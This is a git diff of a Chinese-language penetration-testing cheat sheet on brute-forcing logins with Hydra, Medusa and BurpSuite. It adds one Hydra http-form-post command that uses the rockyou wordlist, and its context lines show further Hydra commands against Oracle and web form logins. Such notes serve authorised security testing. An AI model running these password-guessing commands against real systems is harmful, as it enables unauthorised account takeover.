@@ -133,7 +133,7 @@ hydra -L usernames.txt -P passwords.txt oracle://192.168.xxx.xx
 
 * **mongodb**：可使用Medusa
 
-### 组合使用进行爆破（Hydra + BurpSuite）
+## 组合使用进行爆破（Hydra + BurpSuite）
 
 * 常针对Web应用程序登录界面的表单进行爆破 (HTTP / HTTPS)
 
@@ -151,6 +151,11 @@ hydra -L usernames.txt -P passwords.txt 192.168.1.100 http-form-post "/login:use
 
 ```bash
 hydra -L usernames.txt -P passwords.txt 192.168.1.100 https-form-post "/login:username=^USER^&password=^PASS^:F=incorrect"
+```
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.xxx.xx http-form-post "/form/frontpage.php:user=admin&pass=^PAS
+S^:INVALID LOGIN"  -vV -f
 ```
 
 #### **http-form-get**：
@@ -188,3 +193,6 @@ hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share
 
 * \`/login.php:username=^USER^\&password=^PASS^\`：此处需要使用BurpSuite拦截表单请求，根据实际情况进行修改
 * \`F=\<form name='login' \`：此处需要查看源码中表单实际的名称进行修改
+
+
+
